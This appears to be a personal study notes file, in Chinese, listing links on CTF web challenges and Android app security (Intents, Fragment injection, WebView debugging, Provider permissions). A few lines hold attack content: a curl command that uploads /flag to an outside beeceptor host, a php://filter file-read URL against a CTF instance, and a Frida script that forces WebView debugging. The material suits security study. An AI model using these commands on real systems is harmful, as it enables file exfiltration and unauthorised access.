@@ -1,0 +1,492 @@
+[津门杯]XCTF-天津站-2021-Web-uploadhub
+https://www.cnblogs.com/Gu0oooo/p/14762679.html
+
+
+
+文件上传 (4) 利用正则回溯pcre限制，pcre默认限制为100w。
+https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
+PHP利用PCRE回溯次数限制绕过某些安全限制
+
+https://tool.oschina.net/commons/
+
+
+(7) 二次渲染
+https://github.com/hxer/imagecreatefrom-/tree/master/
+https://www.freebuf.com/articles/web/54086.html
+http://www.vuln.cn/6411
+
+
+php_myadmin4.8.1 文件包含漏洞CVE-2018-12613
+https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613
+
+https://xz.aliyun.com/t/8163
+
+
+CockpitCMS NoSQL注入漏洞分析
+https://www.anquanke.com/post/id/241113
+
+		https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
+		https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
+		
+
+
+https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html
+
+https://blog.rois.io/en/2020/rctf-2020-official-writeup-2/#Calc
+
+
+
+https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547
+
+绕过 <?php,<?=
+		https://www.php.net/manual/zh/language.basic-syntax.phpmode.php
+		
+		其中第2种在php7种不可以使用，在php5中可以使用
+
+XXE
+https://xz.aliyun.com/t/3357#toc-8
+https://beeceptor.com/
+
+
+GKCTF X DASCTF 2021_babycat复现学习
+https://www.cnblogs.com/TJWater/p/14982594.html
+
+
+https://guokeya.github.io/post/6tkxFuPHB/> 
+
+https://www.icode9.com/content-1-1161732.html
+
+CTFshow刷题日记-WEB-JAVA(web279-300)-struts2全系列漏洞复现
+https://www.icode9.com/content-1-1161732.html
+
+
+https://paper.seebug.org/597/
+EXP生成脚本
+https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py 
+
+
+https://www.zhaoj.in/read-6859.html
+
+Java 反序列化漏洞始末（4）— jackson
+http://b1ue.cn/archives/189.html
+
+<https://bbs.ichunqiu.com/thread-61381-1-1.html> 
+
+
+
+工具使用-JNDI
+https://www.cnblogs.com/Welk1n/p/11701401.html
+
+
+JWT原理
+https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob
+
+
+buuctf [MRCTF2020]Ezaudit 伪随机数
+<https://www.cnblogs.com/BreakdDawn/p/13413505.html> 
+
+
+https://buuoj.cn/challenges#[MRCTF2020]Ezaudit
+
+
+可以尝试curl直接读文件
+curl -F 'file=@/flag' https://kkktest.free.beeceptor.com
+
+
+来自 <https://www.pythonf.cn/read/49522> 
+
+
+https://s0urcec0der.github.io/wooyun-drop-fork/drop/Nmap%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C.html
+
+
+【绿盟大讲堂】CTF夺旗赛最强秘籍PART2：WEB
+https://blog.nsfocus.net/ctf-class-part-2/
+
+getshell
+https://doc.u0u.us/zh-hans/getting_started/first_shell.html
+
+http://www.jsfuck.com/
+
+
+
+LINUX下反弹SHELL的种种方式
+[前言：在乌云社区看到反弹shell的几种姿势，看过之余自己还收集了一些，动手试了下，仅供参考]
+来自 <https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html> 
+
+curl反弹shell
+来自 <https://www.btis.site/2020/05/19/2020%E7%BD%91%E9%BC%8E%E6%9D%AFPicDown%E3%80%81VNCHECKIN%EF%BC%88%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E3%80%81%E5%BC%B9shell%EF%BC%89/#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown
+
+
+[BSidesCF 2020]Hurdles
+https://www.cnblogs.com/dongqq/p/13489654.html
+
+
+[b01lers2020]Scrambled(python脚本编写)
+https://guokeya.github.io/post/dyBQujG-Z/
+来自 <https://guokeya.github.io/post/XxOKeal9U/> 
+
+
+来自 <http://www.voycn.com/article/wust-ctf2020-wp> 
+
+JavaScript原型链污染-clone/undersafe等
+https://buuoj.cn/challenges#[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E
+
+
+[GYCTF2020]Ez_Express _
+https://www.cnblogs.com/LEOGG321/p/13448463.html> 
+
+
+string转ascii
+https://eve.gd/2007/05/23/string-fromcharcode-encoder/
+
+
+
+文章：https://www.4hou.com/index.php/posts/Zppg
+
+[HFCTF2020]JustEscape(VM沙箱逃逸)
+来源：https://tothemoon2019.github.io/2020/10/21/%E7%AC%AC%20%E4%BA%94%20%E5%91%A8%20write%20up%20%5B%5BHFCTF2020%5DJustEscape%20%5BBJDCTF2020%5DEasySearch%20HCTF-2018-Web-warmup%5D/
+
+
+
+https://bycsec.top/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/> 
+
+js 混淆
+https://www.vlwx.com/202.html
+
+
+来自 <https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html> 
+<https://www.cxymm.net/article/qq_41636200/119958733#web3%20crawler_z> 
+
+https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/
+
+
+https://www.cnblogs.com/Gcker/p/13559735.html
+
+
+BUUCTF-https://buuoj.cn/challenges
+
+247 CTF https://247ctf.com/dashboard
+
+
+官方赛事wp https://www.ctfwp.com/
+
+https://adworld.xctf.org.cn/ 攻防世界
+
+
+https://www.ctfhub.com/
+
+https://paper.seebug.org/597/
+
+RCE with spring-security-oauth2 分析-【CVE-2018-1260】
+https://www.php.net/manual/zh/wrappers.data.php
+
+PHP利用PCRE回溯次数限制绕过某些安全限制
+https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html
+一些不包含数字和字母的webshell
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html#
+
+php一句话木马
+https://segmentfault.com/q/1010000010717254> 
+
+
+
+https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File
+前面有一堆信息收集
+
+最后可以使用PHP协议读取文件
+http://00c84681-0a30-47cb-9a22-b087520a0717.node4.buuoj.cn:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
+
+
+PHP协议官方文档
+https://www.php.net/manual/zh/wrappers.php.php
+
+
+https://jiang-niao.github.io/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/
+
+PHP伪协议总结
+https://segmentfault.com/a/1190000018991087> 
+
+
+https://y4tacker.blog.csdn.net/article/details/113588692
+
+https://www.toolnb.com/dev/runCode/243e11a40a13ca67d0f13d10dadfdd48.html
+在线反序列化
+
+
+https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html
+	
+
+解析缺陷
+https://www.cnblogs.com/Lee-404/p/12826352.html
+
+data伪协议：
+https://www.php.net/manual/zh/wrappers.data.php
+
+支持的协议和封装的协议
+https://www.php.net/manual/zh/wrappers.php
+
+
+https://segmentfault.com/a/1190000018991087
+
+php  filter的妙用
+https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+
+https://blog.51cto.com/u_15082392/3369049
+
+
+http://www.360doc.com/content/18/0819/20/58821437_779534430.shtml
+
+
+https://darkwing.moe/2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/?utm_source=tuicool&utm_medium=referral
+
+
+https://mayi077.gitee.io/2020/05/17/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/> 
+
+来自 <https://www.136.la/jingpin/show-161383.html> 
+
+
+伪协议与文件包含
+https://www.cnblogs.com/kuaile1314/p/11897097.html> 
+
+<https://xz.aliyun.com/t/2557> 
+
+preg_match绕过
+<https://www.cnblogs.com/20175211lyz/p/12198258.html> 
+
+
+
+php处理哈希字符串 http://www.cnblogs.com/Primzahl/p/6018158.html
+
+详细参照 http://www.freebuf.com/news/67007.html
+
+https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat
+
+
+黑名单绕过
+https://mayi077.gitee.io/2020/05/17/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/
+具体参考
+https://mayi077.gitee.io/2020/03/14/CTFHub-%E4%B9%8B-RCE/
+
+PHP 反序列化
+https://as1def.github.io/2020/10/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8CPOP%E9%93%BE%E6%9E%84%E9%80%A0/> 
+另外一篇文章也可以参考
+https://www.jianshu.com/p/150cb693f77b
+
+
+https://www.leavesongs.com/PENETRATION/php-filter-magic.html
+
+
+https://syunaht.com/p/2339718074.html
+
+https://cyc1e183.github.io/2020/08/04/WMctf2020-Checkin%E5%87%BA%E9%A2%98%E6%83%B3%E6%B3%95-%E9%A2%98%E8%A7%A3/
+
+
+//类自动加载
+https://www.php.net/manual/zh/language.oop5.autoload.php
+
+https://daweitech.github.io/2021/09/04/buu/20/
+
+php7中修改了表达式执行的顺序：http://php.net/manual/zh/migration70.incompatible.php
+
+无字母数字webshell之提高篇
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
+
+
+
+https://blog.codesec.work/d6b7888bcefc/
+
+
+
+https://bbs.ichunqiu.com/thread-61381-1-1.html
+另外一个参考的博客
+http://www.yang99.top/index.php/archives/48/#easytp
+
+
+Intent flag 与启动模式的对应关系 
+https://www.cnblogs.com/ttylinux/p/4069513.html
+
+Android零基础入门｜Intent 属性详解（下） 
+https://www.sohu.com/a/199067639_619467
+
+PendingIntent的内部机制
+https://www.jianshu.com/p/9bbf4ca7d729
+
+Android中pendingIntent的深入理解—ok
+https://www.cnblogs.com/Alex80/p/11519886.html
+
+
+Android开发学习笔记：Intent的简介以及属性的详解--OK
+https://www.cnblogs.com/janeaiai/p/5748269.html
+
+Android开发-API指南-<data>--OK
+https://www.cnblogs.com/popapa/p/android_data-element.html
+
+【译文】通过 android:ssp 高效过滤 Android Intents
+https://www.jianshu.com/p/7069b330c328
+Intent详解
+https://juejin.cn/post/6844904113793138702
+
+参考链接：
+http://ju.outofmemory.cn/entry/121143
+https://juejin.im/post/5bced39c6fb9a05d0045ec3c
+
+Androidn Notification的使用,解决找不到setLatestEventInfo方法
+https://www.cnblogs.com/nimorl/p/7692718.html
+
+Android系列之Fragment（一）----Fragment加载到Activity当中
+https://www.cnblogs.com/qianguyihao/p/3978989.html
+
+
+参考链接：
+http://ju.outofmemory.cn/entry/121143
+https://juejin.im/post/5bced39c6fb9a05d0045ec3c
+
+首先解释设置了Intent.FLAG_ACTIVITY_NEW_TASK的应用的调用过程。下面这段话比较详细的解释了这个参数工作的过程。
+参考链接http://www.cnblogs.com/xiaoQLu/archive/2012/07/17/2595294.html
+
+
+
+
+Android系列之Fragment（一）----Fragment加载到Activity当中
+https://www.cnblogs.com/qianguyihao/p/3978989.html
+Android系列之Fragment（二）----Fragment的生命周期和返回栈
+Android系列之Fragment（三）----Fragment和Activity之间的通信（含接口回调）
+Android系列之Fragment（四）----ListFragment的使用
+
+Android中的sharedUserId
+https://www.jianshu.com/p/0e41405b4d87
+
+
+Android安全开发之Provider组件安全
+https://yq.aliyun.com/articles/53933?spm=a2c4e.11153940.0.0.500f682b2arDZs
+
+参考链接：https://bbs.pediy.com/thread-183459.htm
+https://mp.weixin.qq.com/s/BPYjCz2wlkGOijb-sUcrQg
+http://drops.xmd5.com/static/drops/mobile-8165.html
+参考链接：https://blog.csdn.net/u013553529/article/details/53856800
+【3】参考链接
+https://developer.android.com/reference/android/preference/PreferenceActivity.html#isValidFragment(java.lang.String)
+【4】参考链接
+http://wolfeye.baidu.com/blog/android-fragment-injection/
+http://bbs.pediy.com/showthread.php?t=183459&highlight=fragment
+【2】更多内容
+http://drops.xmd5.com/static/drops/mobile-8165.html
+
+Fragment Injection漏洞杂谈 – 路人甲—ok
+http://www.vuln.cn/6207
+
+Android 获取meta-data中的数据--ok
+https://www.cnblogs.com/fwling/p/6252958.html
+
+
+BroadcastReceiver广播接收者(六)——粘性广播(StickyBroadcast)使用示例
+https://yq.aliyun.com/articles/267532
+
+webview调试：
+xposed方法：
+1、	手机安装Xposed框架，并安装WebViewDebugHook插件：
+插件地址：https://github.com/feix760/WebViewDebugHook
+插件安装参考链接：https://blog.csdn.net/zhulin2609/article/details/51437821
+7、	下断点调试（调试方法与普通的前端调试一样），在调试过程中，从前端代码里就可以看到native层开放的JS能力接口，并且可以将JS页面对应的变量打印出来，用于加深对业务逻辑的理解。如下为几个例子：
+（1）	通过console获取当前WebView界面的接口信息
+在console控制台输入var msg='';for(i in window){msg += i + ',';}
+
+
+frida方法：
+frida -R -f com.huawei.appmarket -l webview.js --no-pause
+webview.js脚本：
+Java.perform(function() {
+       clazz = Java.use("android.webkit.WebView");
+       clazz.getSettings.implementation = function(){
+              console.log("getSettings true");
+              var ret=this.getSettings();
+              this.setWebContentsDebuggingEnabled(true);
+              return ret;
+    };
+});
+
+
+1、	Chrome devtools inspect后打开空白解决办法
+http://madong.net.cn/index.php/2017/05/597/
+2、	通过WLAN方式连接adb
+https://developer.android.com/studio/command-line/adb?hl=zh-cn
+3、	强制开启android webview debug模式使用Chrome inspect
+https://blog.csdn.net/zhulin2609/article/details/51437821
+4、	Android WebView 调试方法
+https://www.cnblogs.com/wmhuang/p/7396150.html
+6、如何关闭Linux里边的selinux
+https://zhidao.baidu.com/question/1241030238320487179.html
+
+
+https://www.cnblogs.com/zharma/p/8502696.html
+https://www.cnblogs.com/ricoliu/p/6361022.html
+https://www.cnblogs.com/zharma/p/8504873.html
+https://www.2cto.com/kf/201805/745048.html
+http://www.droidsec.cn/android-webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B9%8Bgetclassloader/
+https://www.aqniu.com/threat-alert/30758.html
+http://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html
+http://www.droidsec.cn/webview-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/
+
+
+http://javascript.ruanyifeng.com/stdlib/console.html
+http://yanhaijing.com/basejs/index.html#sect_conventions
+https://leohxj.gitbooks.io/front-end-database/javascript-basic/scoping-and-hoisting.html
+https://developer.mozilla.org/zh-CN/docs/Learn/Getting_started_with_the_web/JavaScript_basics
+http://www.w3school.com.cn/jsref/dom_obj_window.asp
+http://www.w3school.com.cn/jsref/met_win_setinterval.asp
+http://www.runoob.com/js/js-json.html
+https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON
+http://www.runoob.com/js/js-json.html
+https://www.cnblogs.com/Jener/p/5878858.html
+https://javascript.ruanyifeng.com/stdlib/object.html
+
+
+Android APP 漏洞之战——WebView 漏洞详解
+https://zhuanlan.zhihu.com/p/554069141
+
+androguard - Decompiler.wiki
+https://code.google.com/archive/p/androguard/wikis/Decompiler.wiki
+
+
+https://androguard.readthedocs.io/en/latest/
+https://bbs.pediy.com/thread-204936.htm
+https://cloud.tencent.com/developer/article/1595381
+https://github.com/androguard/androguard/issues/204
+
+https://pygments.org/docs/formatters/
+https://www.cnblogs.com/machangwei-8/p/10738244.html
+https://www.pythonf.cn/read/98517
+http://www.ityouknow.com/python/2019/12/29/python-excel-103.html
+
+
+https://bugs.chromium.org/p/chromium/issues/detail?id=938251
+https://android.googlesource.com/platform/frameworks/base.git/+/f203aeef993b0f4ce65c9630d06bbd50a504e89f/core/java/android/webkit/BrowserFrame.java 
+https://android.googlesource.com/platform/frameworks/base/+/534a67c/core/java/android/webkit/AccessibilityInjector.java
+
+
+
+0x01 	Android的Crash机制
+深入理解 Android 9.0 Crash 机制（一）
+参考https://juejin.im/post/5d527645e51d45620b21c394
+https://developer.android.com/topic/performance/vitals/crash
+0x02 	防御方案
+引入Cockroach
+地址https://github.com/android-notes/Cockroach
+
+
+https://oversecured.com/scan/info/89b938ac-e8d8-42ea-a79d-af4f5b2970ab
+
+Provider权限
+1.1.2	Provider设置权限<grant-uri-permission xxx>（部分URI的granting）
+https://www.cnblogs.com/popapa/p/android_grant-uri-permission-element.html
+provider可以只开放部分URI的权限，针对其中某个或某部分URI，单独进行权限设置
+https://www.cnblogs.com/popapa/p/android_path-permission-element.html
+https://developer.android.google.cn/training/secure-file-sharing/share-file
+https://developer.android.google.cn/training/secure-file-sharing/setup-sharing
+
+https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/
+
+
+Android 中是如何使用 FileProvider 进行文件共享的（ContentProvider 进行数据共享也是类似的）
+这部分内容请主要参考下述链接：
+https://developer.android.google.cn/training/secure-file-sharing/setup-sharing
